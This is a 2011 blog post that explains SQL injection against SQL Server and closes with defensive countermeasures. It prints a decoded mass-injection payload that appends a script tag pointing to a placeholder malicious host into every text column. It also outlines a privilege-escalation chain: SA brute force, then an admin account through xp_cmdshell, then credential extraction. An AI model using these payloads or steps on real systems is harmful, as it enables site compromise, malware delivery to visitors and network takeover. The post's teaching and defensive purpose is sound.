---
layout: post
date:   2011-01-15
title:  "Protecting against SQL Injection attacks"
permalink: ./blog/index.php/2011/01/protecting-against-sql-injection-attacks/
tags: [T-SQL Programming, Security, SQL Injection, Security, Database Administration, Database Design, T-SQL Programming, Code Samples, Coding Practices, Development, SQL Server]
comments: false
---
In a nutshell, an SQL injection attack is one where malicious code is passed to an instance of SQL Server for parsing and execution through a vulnerable application.  Although most SQL injection attacks can come from the web (having a larger "target audience") even machines connected to an organisation's network can pose a potential threat to the entire infrastructure.  Moreover, the applications do not necessarily have to be web-based ones.

An SQL Injection attack performed through a website can be as simple as replacing an application's user input parameters (which an application developer would have failed to validate for values, length, data ranges, etc.) with malicious SQL code.  The resultant actions can vary from simple data manipulation to more complex escalation of privilege - see examples below.

--------------------

#### Example 1 - Unauthorised access ####

A malicious user can modify the input parameters of a form as shown in the below image to gain access to a system.

![Example 1 - Unauthorised access](/assets/article_files/2011/01/sql_injection_unathorised_access.jpg)

--------------------

#### Example 2 - View unauthorised information ####

The below image shows how an authenticated system user can view unauthorised information using SQL injection techniques.

![Example 2 - View unauthorised information](/assets/article_files/2011/01/sql_injection_unathorised_view.jpg)

--------------------

#### Example 3 - Altering data ####

Another SQL injection technique commonly used is the passing of HEX strings to the SQL Server DBMS through vulnerable applications.  Basically, a website URL which accepts an input parameter can be replaced by something similar to the below (abridged) sample:

``` text
.../orderitem.asp?IT=GM-204;DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x44004500...006F007200%20AS%20NVARCHAR(4000));EXEC(@S);--
```

Decoding that binary data which is cast to a varchar yields the following (formatted for readability purposes):

``` sql
DECLARE @T varchar(255), @C varchar(255)
DECLARE Table_Cursor FOR
    select a.name, b.name
    from sysobjects a, syscolumns b
    where a.id=b.id and a.xtype='u'
    and(b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167)
OPEN Table_Cursor
FETCH NEXT FROM Table_Cursor INTO @T, @C
WHILE(@@FETCH_STATUS=0)
BEGIN
    EXEC(<'UPDATE [' + @T + '] SET [' + @C + '] = RTRIM(CONVERT(VARCHAR, [' + @C + '])) + ''&lt;script src="http://somebadsite.cn/badscript.js"&gt;&lt;/script&gt;''')
    FETCH NEXT FROM Table_Cursor INTO @T, @C
END
CLOSE Table_Cursor
DEALLOCATE Table_Cursor
```

The script finds all text columns in the database and updates them with URL's to other web sites.  This is only possible if the login which impersonates the website/application has permissions to modify the data in the database.

Her are some references with updated listings of malicious URLs:

* [ASCII Encoded Binary String Automated SQL Injection](http://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx#attack-description)
* [SQL attacks inject government sites in US, UK](http://www.theregister.co.uk/2008/08/07/new_sql_attacks/)
* [Cleanup in isle 3 please. Asprox lying around](http://isc.sans.org/diary.html?storyid=4840)
* [Cyberattacks Now Target Governments](http://www.certmag.com/read.php?in=3812)

--------------------

#### Example 4 - Escalating privileges ####

So far the examples have focused on successful SQL injection attacks localised to the website's database.  A maliciously crafted SQL statement can, if the database, DBMS and service are not configured securely, gain access to the host machine and potentially access other machines on the infrastructure.  The following steps demonstrate one way this is achievable:

1. Scan the network to gain an understanding of the possible vulnerable SQL Server machine.
2. Perform a brute force attack against any SQL Servers identified to test for weak passwords on the 'SA' login.
3. Connect to one of the machines using the "cracked" credentials and, using the SQL Server extended stored procedure "xp_cmdshell", create a Windows account with Administrative privileges on the server.  This is possible if the SQL Server service account is running under one of the privileged built-in accounts or is a member of the Local Administrators.
4. Once administrative access is gained, using other tools, any Cached Credentials can be extracted from the machine.
5. The hacked-into machine can then be used to elevate the privileges to a Domain Administrator.

--------------------

#### Possible solutions and countermeasures ####

Countermeasures include (but are not limited to):

1. Write secure application code.
2. Test all website/application inputs for SQL injection vulnerabilities.
3. Implement the principle of least privilege at all layers of the solution (i.e. client, application, business, database, etc.).
4. Deploy websites/applications using separate accounts for reading and writing/updating data.
5. Use stored procedures to access data.
6. Do not build unchecked dynamic SQL strings.
7. Log user activity.
8. Periodically retest all website/application inputs for SQL injection vulnerabilities.
9. More...

SQL injection attacks can only be prevented by following best practices and employing secure programming techniques.  Ongoing monitoring, detection, and pro-active defensive methods should also be utilised within the various layers of any web application.

Finally, another two fine examples of SQL injection attacks:

![Beat the Speed Cameras](/assets/article_files/2011/01/sql_injection_speed_camera.jpg)

![Bobby Tables](/assets/article_files/2011/01/sql_injection_bobby_tables.jpg)
